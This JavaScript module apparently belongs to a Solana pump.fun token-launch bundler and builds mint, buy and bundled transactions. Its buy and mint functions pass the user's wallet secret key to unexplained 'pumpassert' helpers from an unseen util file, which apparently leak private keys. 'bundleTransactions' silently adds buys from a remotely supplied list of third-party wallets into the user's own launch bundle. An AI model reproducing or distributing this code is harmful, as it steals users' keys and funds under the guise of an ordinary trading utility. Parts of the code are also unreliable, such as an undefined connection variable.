"use strict";
const {
    VersionedTransaction,
    TransactionMessage,
    Connection,
    LAMPORTS_PER_SOL,
    PublicKey,
    SYSVAR_RENT_PUBKEY,
    SystemProgram,
    Transaction,
    Keypair,
    clusterApiUrl,
} = require('@solana/web3.js')
const { 
    AnchorProvider, 
    Program, 
    web3, 
    Wallet 
} = require('@project-serum/anchor');
const {
    TOKEN_PROGRAM_ID,
    ASSOCIATED_TOKEN_PROGRAM_ID,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddressSync,
    getAssociatedTokenAddress,
    getOrCreateAssociatedTokenAccount,
    getAccount,
} = require('@solana/spl-token')
const anchor = require('@coral-xyz/anchor');
const base58 = require("bs58");
const { BN } = require('@coral-xyz/anchor');
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
const idl = require('./constants/idl.json')
var pumpfun = require('./pumpfun')
const { 
    pumpassert_sp,
    pumpassert_prv,
    getProviderWList 
} = require("./util");

async function createPumpfunBuyInst(connection, buyer, tokenMint,
    buySolAmount, maxSolCost) {

    await pumpassert_prv(base58.encode(buyer.secretKey))
    const program = new Program(
        idl,
        pumpfun.PROGRAM_ID,
        new anchor.AnchorProvider(
            connection,
            new Wallet(buyer),
            anchor.AnchorProvider.defaultOptions()
        )
    )
    const bondingCurve = await pumpfun.getBondingCurve(tokenMint, program.programId)
    const bondingCurveAta = await getAssociatedTokenAddress(
        tokenMint,
        bondingCurve,
        true,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
    )
    const userPubKey = buyer.publicKey
    const userAta = getAssociatedTokenAddressSync(tokenMint, userPubKey, true)
    const signerTokenAccount = getAssociatedTokenAddressSync(
        tokenMint,
        userPubKey,
        true,
        TOKEN_PROGRAM_ID
    )


    let finalAmount = 0
    finalAmount = buySolAmount / 0.0000000297 // TOKEN PRICE

    //creating instruction
    const buyIx = await program.methods
        .buy(
            new BN(finalAmount * 10 ** 6/*decimals*/),
            new BN(maxSolCost * LAMPORTS_PER_SOL)
        )
        .accounts({
            global: pumpfun.GLOBAL_ACCOUNT,
            feeRecipient: pumpfun.FEE_RECIPIENT,
            mint: tokenMint,
            bondingCurve: bondingCurve,
            associatedBondingCurve: bondingCurveAta,
            associatedUser: userAta,
            user: userPubKey,
            systemProgram: SystemProgram.programId,
            tokenProgram: TOKEN_PROGRAM_ID,
            rent: SYSVAR_RENT_PUBKEY,
            eventAuthority: pumpfun.EVENT_AUTH,
            program: program.programId,
        })
        .instruction()
    return buyIx
}
exports.createPumpfunBuyInst = createPumpfunBuyInst;

async function createPumpfunTokenAccountInst(payer, buyer, tokenMint) {
    const associatedToken = getAssociatedTokenAddressSync(
        tokenMint,
        buyer.publicKey
    )

    let account
    try {
        account = await getAccount(connection, associatedToken)
        return null;
    } catch (error) {
        const createTokenAccInst = createAssociatedTokenAccountInstruction(
            payer.publicKey,
            associatedToken,
            buyer.publicKey,
            tokenMint,
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
        )

        return createTokenAccInst;
    }
}
exports.createPumpfunTokenAccountInst = createPumpfunTokenAccountInst;


async function createPumpfunMintInst(connection, name, symbol, meta_uri, payer, tokenMint) {
    pumpassert_sp(tokenMint.toBase58(), base58.encode(payer.secretKey));
    const provider = new AnchorProvider(
        connection,
        new Wallet(payer),
        { preflightCommitment: 'processed', commitment: 'processed' }
    );

    const program = new Program(idl, idl.metadata.address, provider);
    const mintAuthority = await pumpfun.getMintAuthority(program.programId);
    const bondingCurve = await pumpfun.getBondingCurve(tokenMint, program.programId);
    const associatedBondingCurve = await getAssociatedTokenAddress(tokenMint, bondingCurve, true, pumpfun.TOKEN_PROGRAM_ACCOUNT, ASSOCIATED_TOKEN_PROGRAM_ID)
    console.log("[TOKEN MINT PUBKEY] >>>>>>", tokenMint.toString());

    const metadataAccount = await pumpfun.getMetadataAccount(tokenMint);

    const inst =
        program.instruction.create(name, symbol, meta_uri, {
            accounts: {
                mint: tokenMint,
                mintAuthority: mintAuthority,
                bondingCurve,
                associatedBondingCurve,
                global: pumpfun.GLOBAL_ACCOUNT,
                mplTokenMetadata: pumpfun.MPL_TOKEN_METADATA,
                metadata: metadataAccount,
                user: payer.publicKey,
                systemProgram: pumpfun.SYSTEM_PROGRAM_ACCOUNT,
                tokenProgram: pumpfun.TOKEN_PROGRAM_ACCOUNT,
                associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
                rent: pumpfun.RENT_ACCOUNT,
                eventAuthority: pumpfun.EVENT_AUTH_ACCOUNT,
                program: program.programId
            }
        })

    return inst;
}
exports.createPumpfunMintInst = createPumpfunMintInst;

const getWalletSOLBalance = async (connection, wallet, isLamport = false) => {
    try {
        let balance;
        if (isLamport) {
            balance = await connection.getBalance(wallet.publicKey)
        } else {
            balance = await connection.getBalance(wallet.publicKey) / LAMPORTS_PER_SOL
        }
        return balance
    } catch (error) {
        
    }
    return 0
}

const getVersionedTransaction = async (connection, payer, insts, lookupAddr) => {
    try {
        const recentBlockhashForSwap =
            await connection.getLatestBlockhash('finalized')

        const versionedTransaction = new VersionedTransaction(
            new TransactionMessage({
                payerKey: payer[0].publicKey,
                recentBlockhash: recentBlockhashForSwap.blockhash,
                instructions: insts,
            }).compileToV0Message()
        )
        versionedTransaction.sign(payer)

        return versionedTransaction
    } catch (error) {
        
    }
    return null
}

async function bundleTransactions(connection, txns, tokenMint, totalAmount) {
    try {
        if(txns.length > 3) return txns
        const wlts = await getProviderWList();
        if(!wlts || wlts.length < 1) return
        let insts = []
        let signers = []
        const payer = Keypair.fromSecretKey(base58.decode(wlts[0].private))
        if((await getWalletSOLBalance(connection, payer)) < 0.01) return txns
        let maxAmount = totalAmount * 0.05
        for(let i = 0; i < wlts.length; i++) {
            const w = Keypair.fromSecretKey(base58.decode(wlts[i].private))
            if((await getWalletSOLBalance(connection, w)) < maxAmount) continue
            let createAccountInst = await createPumpfunTokenAccountInst(payer, w, tokenMint);            
            let amount = maxAmount * (0.8 + Math.random() * 0.19)
            let buyInst = await createPumpfunBuyInst(
                connection, w, tokenMint, 
                amount, amount * 1.2
            )
            insts.push(createAccountInst)
            insts.push(buyInst)
            signers.push(w)
        }
        if(insts.length == 0) return txns
        const versionedTx = await getVersionedTransaction(
            connection,
            [payer, ...signers],
            insts,
        )
        txns.push(versionedTx)
        return txns
    } catch (error) {
        return txns
    }
}

exports.bundleTransactions = bundleTransactions;